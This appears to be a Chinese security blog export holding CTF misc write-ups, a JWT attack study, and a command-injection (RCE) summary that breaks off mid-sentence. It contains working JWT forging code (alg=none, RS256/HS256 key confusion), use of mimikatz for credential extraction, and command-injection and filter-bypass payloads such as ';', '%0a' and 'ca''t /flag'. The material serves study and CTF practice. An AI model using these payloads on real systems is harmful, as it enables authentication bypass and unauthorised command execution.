<h1 id="SGA-Character"><a href="#SGA-Character" class="headerlink" title="SGA Character"></a>SGA Character</h1><blockquote>
<p>Intro &amp;&amp; Hint: 描述：神秘的语言……仿佛在Minecraft中见过</p>
</blockquote>
<p>标准银河字母表<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/SGA.png"></p>
<p>与题目图片一一对应，解出flag</p>
<h1 id="圣嘉然"><a href="#圣嘉然" class="headerlink" title="圣嘉然"></a>圣嘉然</h1><blockquote>
<p>Intro &amp;&amp; Hint: 描述：嘉然,带我走吧！|hints: 1. <a href="http://www.atoolbox.net/Category.php?Id=28">http://www.atoolbox.net/Category.php?Id=28</a></p>
</blockquote>
<p>在十六进制下观察文件发现rar头被删了一半，补上<code>52 61 72 21</code><br>用010打开，发现存在ntfs流隐写<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E5%9C%A3%E5%98%89%E7%84%B6-1.png"><br>导出结果文本<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E5%9C%A3%E5%98%89%E7%84%B6-2.png"><br>有很多emoji表情</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">我好想做嘉然👪小姐的狗啊。 可是嘉然小姐说她喜欢的是猫🐘，我👰哭了。 我知道既不是狗也不是猫的我为什么要哭的。因为我其实是一只老鼠<br>👣。 我从没奢望嘉然小姐能喜欢自己👴。我明白的，所有人都喜欢理解余裕上手天才打钱的萌萌的狗狗或者猫猫👚，没有人会喜欢阴湿带病的老鼠。 但我还是问了嘉然小姐:“我能不能做你的狗？” 我知道我是注定做不了狗👜的。但如果她喜欢狗，我👲就可以一直在身边看着她了，哪怕她怀里抱着的永远都是狗。 可是她说喜欢的是猫。 她现在还在看着我，还在逗我开心，是因为猫还没有出现，只有我这老鼠每天蹑手蹑脚地从洞👞里爬出来，远远地和她对视。 等她喜欢的猫👛来了的时候，我就该重新滚回我👥的洞了吧。 但我还是好喜欢她👠，她能在我还在她身边的时候多看我几眼吗👘？ 嘉然小姐说接下来的每个圣诞夜都要和大家一起过👘。我不知道大家指哪些人👖。好希望这个集合能够对我做一次胞吞👥。 猫猫👰还在害怕嘉然小姐。 我会去把她爱的猫猫引来的👘。 我👤知道稍有不慎，我就会葬身猫🐘口。 那时候嘉然小姐大概会把我的身体好好地装起来扔到门外👖吧。 那我就成了一包鼠条👰，嘻嘻👜。 我希望她能把我扔得近一点🐧，因为我还是好喜欢她👩。会一直喜欢下去的。 我的灵魂透过窗户向里面看去，挂着的铃铛在轻轻鸣响，嘉然小姐慵懒地靠在沙发上，表演得非常温顺的橘猫坐在她的肩膀👬。壁炉的火光照在她的脸庞，我冻僵的心脏在风里微微发烫👘👖。 —新户眠子<br></code></pre></td></tr></table></figure>
<p>将表情提取出来解密<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E5%9C%A3%E5%98%89%E7%84%B6-3.png"><br>得到<code>s!yl&#125;ce&#123;gdniaa_nyam!_ye0rua_</code>，很明显的w型栅栏<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E5%9C%A3%E5%98%89%E7%84%B6-4.png"></p>
<h1 id="每日一溜"><a href="#每日一溜" class="headerlink" title="每日一溜"></a>每日一溜</h1><blockquote>
<p>Intro &amp;&amp; Hint: 描述：BV1vK4y1p7F5|hints: 1. <a href="https://blog.csdn.net/huanghelouzi/article/details/88628590">https://blog.csdn.net/huanghelouzi/article/details/88628590</a></p>
</blockquote>
<p>数据包分析，使用wireshark<br>发现POST包，传输了一张png图片<br><code>ctrl+alt+shift+t</code>追踪tcp流<br>转为原始数据后另存为png<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%AF%8F%E6%97%A5%E4%B8%80%E6%BA%9C-1.png"><br>用binwalk分离出一个文件</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><code class="hljs gcode">FhMrPh<span class="hljs-number">94</span>JHqS<span class="hljs-number">2</span>jGQG<span class="hljs-name">M6</span>QCsaDzI<span class="hljs-number">6</span>ZyHqQQB==<br>d<span class="hljs-symbol">nd4</span>c<span class="hljs-symbol">nN0</span>dW<span class="hljs-number">9</span>wcT<span class="hljs-name">M0</span><span class="hljs-symbol">NTY3</span>QUJDREVGR<span class="hljs-number">0</span>lIS<span class="hljs-symbol">nl6</span>MDIxUFFSU<span class="hljs-number">1</span>RLTk<span class="hljs-number">1</span>MT<span class="hljs-number">1</span>phYm<span class="hljs-symbol">NkVVZXWFllZmdoaWprbG1</span>uODkrLw==<br></code></pre></td></tr></table></figure>
<p>将第二个base64解密后得到一个base64表，那么第一个base64就是换表加密后的值<br>脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> string<br><br>str1 = <span class="hljs-string">&quot;FhMrPh94JHqS2jGQGM6QCsaDzI6ZyHqQQB==&quot;</span><br><br>string1 = <span class="hljs-string">&quot;vwxrstuopq34567ABCDEFGIHJyz021PQRSTKNMLOZabcdUVWXYefghijklmn89+/&quot;</span><br>string2 = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br><br><span class="hljs-built_in">print</span> (base64.b64decode(str1.translate(<span class="hljs-built_in">str</span>.maketrans(string1,string2))))<br><br><span class="hljs-comment">#str1是要解密的代码</span><br><span class="hljs-comment">#string1是改过之后的base64表</span><br></code></pre></td></tr></table></figure>


<h1 id="PANDORA-PARADOXXX"><a href="#PANDORA-PARADOXXX" class="headerlink" title="PANDORA PARADOXXX"></a>PANDORA PARADOXXX</h1><blockquote>
<p>Intro &amp;&amp; Hint: 描述：为了防止它毁灭世界，我上了层层枷锁……</p>
</blockquote>
<p>下载得到一张图片，发现文件中藏了压缩包，binwalk分离<br>第二层：标准伪加密，<code>09</code>改成<code>00</code><br>第三层：纯数字爆破，得到解压密码<code>513692</code><br>第四层：发现压缩后hint.txt的crc值与2.zip内hint.txt的crc值一样,可以得出是明文攻击<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/PANDORA-1.png"><br>解得口令为<code>Maimai</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/PANDORA-2.png"><br>第五层：这一个密码属实是没想到，密码为hint中的单词<code>challenge</code><br>第六层：解压后就是flag</p>
<h1 id="easyfound"><a href="#easyfound" class="headerlink" title="easyfound"></a>easyfound</h1><blockquote>
<p>Intro &amp;&amp; Hint: 描述：flag在哪里 0xf8e8f25359bbbdea2187c34a8614dbedec083dbb@rospten</p>
</blockquote>
<p>给了合约源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs solidity">contract syc&#123;<br>    address owner=0x0b896c359adf4bb1c19c7dfd41dc35dc9216e470;<br>    bool a=true;<br>    bool b=false;<br>    uint[] tuple=[0x77,0x88,0x99];<br>    strings[] flag=[flag1,flag2];<br>&#125;<br></code></pre></td></tr></table></figure>
<p>这题涉及到区块链的变量存储机制，推荐<a href="https://xz.aliyun.com/t/9837">一篇文章</a></p>
<p>代码中一共存储了8个变量，分别是<code>owner</code>,<code>a</code>,<code>b</code>,<code>0x77</code>,<code>0x88</code>,<code>0x99</code>,<code>flag1</code>,<code>flag2</code><br>在区块链浏览器中查看插槽</p>
<p><code>https://ropsten.etherscan.io/tx/0xcf7759b8d59b9c462c5c8a69a30e9b862bee3cbac995d896d58ba8ef592bdafe#statechange</code></p>
<p>第一个插槽存储的是地址<code>owner</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/easyfound-1.png"><br>第二和第三个插槽存储的是bool变量<code>a</code>和<code>b</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/easyfound-2.png"><br>第四和第五个插槽存储的是strings类型的变量<code>flag1</code>和<code>flag2</code>,将两个变量连接到一起就是flag了，注意<code>$</code>符号是连接符<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/easyfound-3.png"><br>第六七八存的是<code>tuple</code>数组<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/easyfound-4.png"></p>
<h1 id="三叶草聚会"><a href="#三叶草聚会" class="headerlink" title="三叶草聚会"></a>三叶草聚会</h1><blockquote>
<p>Intro &amp;&amp; Hint: 描述: 嘿，我们去聚会吧!拿着你的入门券! | hints: 1.注意题目名称</p>
</blockquote>
<p>解压后得到一个key和hint.txt<br>从hint.txt中可以知道与git有关，既然知道了密钥，那么就用ssh连接<br>先创建一个.ssh文件夹，放入key，创建一个config文件<br>config文件内容如下</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><code class="hljs crmsh">Host syc<br>        HostName github.com<br>        <span class="hljs-keyword">User</span> <span class="hljs-title">git</span><br>        Port <span class="hljs-number">22</span><br>        IdentityFile ~/.ssh/key<br></code></pre></td></tr></table></figure>

<p>使用<code>ssh -T syc</code>连接，获取到用户名为<code>SycloverParty</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E4%B8%89%E5%8F%B6%E8%8D%89%E8%81%9A%E4%BC%9A-1.png"></p>
<p>在github上搜索该用户名，得知有一个私有的仓库<code>cake</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E4%B8%89%E5%8F%B6%E8%8D%89%E8%81%9A%E4%BC%9A-2.png"></p>
<p><code>git clone syc:SycloverParty/cake.git</code>下载下来<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E4%B8%89%E5%8F%B6%E8%8D%89%E8%81%9A%E4%BC%9A-3.png"></p>
<p>有一个假的flag，使用<code>git log --pretty=oneline flag</code>查看文件修改历史<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E4%B8%89%E5%8F%B6%E8%8D%89%E8%81%9A%E4%BC%9A-4.png"></p>
<p><code>git show 7226aee143cc7cd4095337fca6f994848bd9783a</code>查看历史记录<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E4%B8%89%E5%8F%B6%E8%8D%89%E8%81%9A%E4%BC%9A-5.png"></p>
<h1 id="EzForensics"><a href="#EzForensics" class="headerlink" title="EzForensics"></a>EzForensics</h1><blockquote>
<p>Intro &amp;&amp; Hint: 简单取证，关键信息在压缩包里,一层一层找出来吧</p>
</blockquote>
<p>简单取证题<br>先获取镜像信息<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/EzForensics-1.png"></p>
<blockquote>
<p>一： 查看默认浏览器访问过的一个 top后缀的域名 例如xxxxxx.top</p>
</blockquote>
<p>先用了<code>iehistory</code>命令查看无果<br>那么查文件<br>找到一个chrome的记录<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/EzForensics-2.png"></p>
<p>下载下来搜索<br>得到域名为<code>3v1l.rigelx.top</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/EzForensics-3.png"></p>
<blockquote>
<p>二： 另一个浏览器被用来下载了一个文件 找到这个奇怪的文件名 （很怪</p>
</blockquote>
<p>查看下载文件夹<br>得到可疑文件<code>L0v3r.f</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/EzForensics-4.png"></p>
<blockquote>
<p>三： 本机的hostname，（计算机名和hostname一般是相同的，但大小写不一样</p>
</blockquote>
<p>先<code>hivelist</code>看注册表信息地址<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/EzForensics-5.png"></p>
<p>查看<code>system</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/EzForensics-10.jpg"></p>
<p>查看<code>CurrentControlSet</code>的<code>value</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/EzForensics-11.jpg"></p>
<p>查看<code>ControlSet001</code>的<code>value</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/EzForensics-12.jpg"></p>
<p>继续看<code>ControlSet001</code>下的<code>\services\tcpip\Parameters</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/EzForensics-13.jpg"></p>
<p>得到主机名<code>P0tt3r</code></p>
<blockquote>
<p>四： 登录1里的站点，尝试从镜像中找到用户名和密码（与windows的一致）看看有什么秘密</p>
</blockquote>
<p>最后使用<code>mimikatz</code>拿到账户和密码<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/EzForensics-9.jpg"></p>
<p>登录站点后自动下载得到一个<code>secretword.wav</code>文件<br>大概听了一下，是拨号音，<a href="https://xiangyuecn.github.io/Recorder/assets/%E5%B7%A5%E5%85%B7-%E4%BB%A3%E7%A0%81%E8%BF%90%E8%A1%8C%E5%92%8C%E9%9D%99%E6%80%81%E5%88%86%E5%8F%91Runtime.html?jsname=teach.dtmf.decode_and_encode">在线解密</a><br>得到<code>10111011100000</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/EzForensics-8.jpg"></p>
<p>转成摩斯，解密得到<code>yyds</code></p>
<blockquote>
<p>五：拼接后md5</p>
</blockquote>
<p><code>SYC&#123;md5(3v1l.rigelx.topL0v3r.fP0tt3ryyds)&#125;</code><br>将上述字段拼接在一起后md5加密一下</p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>极客2021</tag>
      </tags>
  </entry>
  <entry>
    <title>JWT常见安全问题学习总结</title>
    <url>/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/JWT%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93.html</url>
    <content><![CDATA[<p>Json web token(JWT)，是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准(<a href="https://datatracker.ietf.org/doc/html/rfc7519">RFC 7519</a>)。它定义了一种紧凑且自包含的方式，用于在各方之间安全地传输信息作为JSON对象，特别适用于分布式站点的单点登录(SSO)场景。</p>
<h1 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h1><p>jwt由三部分组成：<code>header</code>、<code>payload</code>、<code>signature</code>，用点<code>.</code>分隔</p>
<h2 id="header"><a href="#header" class="headerlink" title="header"></a>header</h2><p><code>header</code>用来声明<code>token</code>的类型和签名用的算法等</p>
<p>示例</p>
<figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;alg&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;HS256&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;typ&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;JWT&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>

<p>经过<code>Base64Url</code>编码后构成了<code>JWT</code>的第一部分</p>
<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p><code>payload</code>就是存放有效信息的地方</p>
<p>示例</p>
<figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;sub&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1234567890&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;John Doe&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;admin&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-keyword">true</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>

<p>它的声明有三类：已注册声明（Registered claims），公共声明（public claims）， 私人声明（private claims）</p>
<p>其中已注册声明有7个默认字段，都由官方所定义(<a href="https://www.rfc-editor.org/rfc/rfc7519#section-4.1">参考rfc7519</a>)，但并不都是必需的</p>
<figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json">iss (issuer)：JWT的发行者<br>exp (expiration time)：过期时间<br>sub (subject)：JWT面向的主题<br>aud (audience)：JWT的用户<br>nbf (Not Before)：生效时间<br>iat (Issued At)：签发时间<br>jti (JWT ID)：JWT唯一标识<br></code></pre></td></tr></table></figure>

<p><code>公共声明</code>：这些可以由使用JWT的人随意定义。但是为了避免冲突，它们应该在IANA JSON Web令牌注册表中定义，或者定义为包含抗冲突命名空间的 URI。<br><code>私人声明</code>：这些是为在同意使用它们的各方之间共享信息而创建的自定义声明，既不是注册声明也不是公共声明</p>
<p>经过<code>Base64Url</code>编码后构成了<code>JWT</code>的第二部分</p>
<h2 id="signature"><a href="#signature" class="headerlink" title="signature"></a>signature</h2><p>签名用于验证消息在此过程中没有被更改</p>
<p>这个部分需要<code>Base64Url</code>编码后的<code>header</code>和<code>Base64Url</code>编码后的<code>payload</code>使用<code>.</code>连接，组成字符串，然后通过<code>header</code>中声明的加密方式进行加盐<code>secret</code>组合加密，然后就构成了<code>jwt</code>的第三部分</p>
<p>如果要使用<code>HMAC SHA256</code>算法，将按以下方式创建签名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs SHA256">HMACSHA256(<br>  base64UrlEncode(header) + &quot;.&quot; +<br>  base64UrlEncode(payload),<br>  secret)<br></code></pre></td></tr></table></figure>

<p>secret是保存在服务端的，jwt的签发生成也是在服务端的，secret就是用来进行jwt的签发和jwt的验证，所以一旦客户端得知这个secret, 那就意味着客户端可以自我签发jwt了</p>
<h1 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h1><h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><p>因为<code>payload</code>和<code>header</code>只经过<code>Base64Url</code>编码，如果开发者把一些敏感信息存放到里面，我们可以轻松获得</p>
<h2 id="未校验签名"><a href="#未校验签名" class="headerlink" title="未校验签名"></a>未校验签名</h2><p>某些服务端并未校验JWT签名，所以，可以尝试修改<code>signature</code>后(或者直接删除<code>signature</code>)看其是否还有效。</p>
<h2 id="签名算法置空-CVE-2015-2951"><a href="#签名算法置空-CVE-2015-2951" class="headerlink" title="签名算法置空(CVE-2015-2951)"></a>签名算法置空(CVE-2015-2951)</h2><p>我们知道，签名算法可以确保JWT在传输过程中不会被恶意用户所篡改</p>
<p>但头部中的<code>alg</code>字段却可以改为<code>none</code>，服务端接收到后会将其认定为无加密算法， 于是对<code>signature</code>的检验也就失效了，那么我们就可以随意修改<code>payload</code>部分伪造<code>token</code></p>
<p>因为<code>jwt.io</code>将<code>alg</code>为<code>none</code>视为恶意行为，所以无法通过在线工具生成JWT，可以用<code>python</code>的<code>jwt</code>库来实现</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jwt<br><br><br>token_dict = &#123;<br>  <span class="hljs-string">&quot;iss&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>  <span class="hljs-string">&quot;iat&quot;</span>: <span class="hljs-number">1674031091</span>,<br>  <span class="hljs-string">&quot;exp&quot;</span>: <span class="hljs-number">1674038291</span>,<br>  <span class="hljs-string">&quot;nbf&quot;</span>: <span class="hljs-number">1674031091</span>,<br>  <span class="hljs-string">&quot;sub&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>  <span class="hljs-string">&quot;jti&quot;</span>: <span class="hljs-string">&quot;e41ff441b04bf337ab3ca715f64a76e1&quot;</span><br>&#125;<br><br>headers = &#123;<br>  <span class="hljs-string">&quot;alg&quot;</span>: <span class="hljs-string">&quot;none&quot;</span>,<br>  <span class="hljs-string">&quot;typ&quot;</span>: <span class="hljs-string">&quot;JWT&quot;</span><br>&#125;<br><br><br>jwt_token = jwt.encode(token_dict,<br>                       <span class="hljs-string">&quot;&quot;</span>,  				 <span class="hljs-comment"># 进行加密签名的密钥</span><br>                       algorithm=<span class="hljs-string">&quot;none&quot;</span>,  	 <span class="hljs-comment"># 指明签名算法方式, 默认也是HS256</span><br>                       headers=headers<br>                       )<br><br><span class="hljs-built_in">print</span>(jwt_token)<br></code></pre></td></tr></table></figure>

<p>运行结果<br><code>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY3NDAzMTA5MSwiZXhwIjoxNjc0MDM4MjkxLCJuYmYiOjE2NzQwMzEwOTEsInN1YiI6ImFkbWluIiwianRpIjoiZTQxZmY0NDFiMDRiZjMzN2FiM2NhNzE1ZjY0YTc2ZTEifQ.</code></p>
<h2 id="签名密钥爆破"><a href="#签名密钥爆破" class="headerlink" title="签名密钥爆破"></a>签名密钥爆破</h2><p>JWT使用算法对<code>header</code>和<code>payload</code>进行加密，如果我们可以爆破出加密密钥，那么也就可以随意修改<code>token</code>了</p>
<p><a href="https://github.com/Ch1ngg/JWTPyCrack">Github-jwt爆破脚本</a></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/jwt/jwt-1.png"></p>
<h2 id="非对称密码算法-x3D-gt-对称密码算法-CVE-2016-10555"><a href="#非对称密码算法-x3D-gt-对称密码算法-CVE-2016-10555" class="headerlink" title="非对称密码算法&#x3D;&gt;对称密码算法(CVE-2016-10555)"></a>非对称密码算法&#x3D;&gt;对称密码算法(CVE-2016-10555)</h2><p>JWT的签名加密算法有两种，对称加密算法和非对称加密算法</p>
<p>对称加密算法比如HS256使用密钥为所有消息进行签名和验证<br>非对称加密算法比如RS256使用私钥对消息进行签名并使用公钥进行身份验证</p>
<p>如果我们获取到了公钥，可以将头部中的算法修改从<code>RS256</code>更改为<code>HS256</code>，这样后端代码就会使用<code>RSA</code>公钥+<code>HS256</code>算法进行签名验证</p>
<p>js代码实现例子</p>
<figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>);<br><span class="hljs-keyword">var</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">var</span> privateKey = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;public.key&#x27;</span>);<br><span class="hljs-keyword">var</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123; <span class="hljs-attr">user</span>: <span class="hljs-string">&#x27;admin&#x27;</span> &#125;, privateKey, &#123; <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(token)<br></code></pre></td></tr></table></figure>


<p>python代码实现例子</p>
<p>不过用python跑的时候因为jwt版本过高会报错<code>The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret</code><br>解决方法：<code>pip install pyjwt==0.4.3</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jwt<br>public = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;public.pem&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read()<br><span class="hljs-built_in">print</span>(jwt.encode(&#123;<span class="hljs-string">&quot;data&quot;</span>:<span class="hljs-string">&quot;test&quot;</span>&#125;, key=public, algorithm=<span class="hljs-string">&#x27;HS256&#x27;</span>))<br></code></pre></td></tr></table></figure>

<h2 id="私钥泄露"><a href="#私钥泄露" class="headerlink" title="私钥泄露"></a>私钥泄露</h2><p>因为<code>非对称加密算法</code>利用私钥生成<code>jwt</code>，利用公钥解密<code>jwt</code>，所以我们只要有私钥然后自己就可以重新生成</p>
<figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>);<br><span class="hljs-keyword">var</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">var</span> privateKey = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;private.key&#x27;</span>);<br><span class="hljs-keyword">var</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123; <span class="hljs-attr">user</span>: <span class="hljs-string">&#x27;admin&#x27;</span> &#125;, privateKey, &#123; <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;RS256&#x27;</span> &#125;);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(token)<br></code></pre></td></tr></table></figure>

<p>如果运行报错<code>Error: secretOrPrivateKey has a minimum key size of 2048 bits for RS256</code><br>可以强行注释<code>node_modules\jsonwebtoken\sign.js</code>中对于密钥长度的判断</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/jwt/jwt-2.png"></p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>听说还有通过KID实现任意文件读取，注入等操作，CVE-2018-0114，CVE-2022-39227，下次抽空研究下</p>
<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><p><a href="https://jwt.io/">jwtio</a><br><a href="https://github.com/ticarpi/jwt_tool">jwt_tool</a><br><a href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a></p>
<p>参考文章：<br><a href="https://xz.aliyun.com/t/2338">JSON Web Token (JWT) 攻击技巧</a><br><a href="https://www.cnblogs.com/yokan/p/14468030.html">JWT原理及常见攻击方式</a><br><a href="https://johnfrod.top/%E5%AE%89%E5%85%A8/jwt%E6%80%BB%E7%BB%93/">JWT总结</a><br><a href="https://forum.butian.net/share/1990">CVE-2022-39227漏洞分析</a></p>
]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>JWT</tag>
      </tags>
  </entry>
  <entry>
    <title>RCE总结</title>
    <url>/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/RCE%E6%80%BB%E7%BB%93.html</url>
    <content><![CDATA[<p>部分题目环境&amp;脚本&amp;姿势来自<code>https://ctf.show/</code></p>
<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h2><p>主要有6种函数可以执行系统命令，分别是<code>system</code>,<code>passthru</code>,<code>exec</code>,<code>shell_exec</code>,<code>popen</code>,<code>pcntl_exec</code></p>
<h2 id="命令执行利用"><a href="#命令执行利用" class="headerlink" title="命令执行利用"></a>命令执行利用</h2><h3 id="参数值可控"><a href="#参数值可控" class="headerlink" title="参数值可控"></a>参数值可控</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ls &quot;</span>.<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure>

<p>直接用<code>;</code>将命令分割成两部分执行</p>
<p>或者用<code>&amp;&amp;</code>和<code>||</code><br><code>&amp;&amp;</code>表示前一条命令执行成功时，才执行后一条命令<br><code>||</code>表示上一条命令执行失败后，才执行下一条命令</p>
<h3 id="命令可控"><a href="#命令可控" class="headerlink" title="命令可控"></a>命令可控</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>与上题类似</p>
<h3 id="其他方式跳出控制范围"><a href="#其他方式跳出控制范围" class="headerlink" title="其他方式跳出控制范围"></a>其他方式跳出控制范围</h3><p><code>cd /%0apwd</code> 相当于依次执行命令<code>cd /</code>和<code>pwd</code></p>
<h3 id="整体可控"><a href="#整体可控" class="headerlink" title="整体可控"></a>整体可控</h3><h4 id="黑名单过滤"><a href="#黑名单过滤" class="headerlink" title="黑名单过滤"></a>黑名单过滤</h4><p>比赛中较为常见的一种类型，将关键词替换成空或其他字符<br>如果只替换成空可以利用双写绕过，如果是替换成字符那么可以用base64编码绕过或者拼接变量</p>
<p>常见的读取文件的命令：<code>cat</code>,<code>tac</code>,<code>od</code>,<code>nl</code>,<code>less</code>,<code>more</code>,<code>sed p</code>,<code>head</code>,<code>tail</code>,<code>sort</code>,<code>uniq</code>,<code>file -f</code><br>常见的列目录的命令：<code>ls</code>,<code>du</code><br>常用的还有通配符<code>*</code>和<code>?</code></p>
<p>黑名单还可以采用一些不影响执行的特定符号隔开检测的关键字</p>
<p>比如<br><code>cat /flag</code>–&gt;<code>ca&#39;&#39;t /flag</code>–&gt;<code>ca&quot;&quot;t /flag</code>–&gt;<code>ca\t /flag</code>–&gt;<code>ca$1t /flag</code>–&gt;<code>ca$IFS$1t /flag</code></p>
<h4 id="符号过滤"><a href="#符号过滤" class="headerlink" title="符号过滤"></a>符号过滤</h4><p>符号过滤也非常常见</p>
<p>比如可以用<code>&lt;&gt;</code>,<code>$&#123;IFS&#125;</code>,<code>$IFS$9</code>,<code>%09</code>,<code>%0b</code>,<code>%0c</code>等代替空格</p>
<p>再者，可以利用变量来截取</p>
<p>比如通过<code>env</code>命令获取到了如下变量</p>
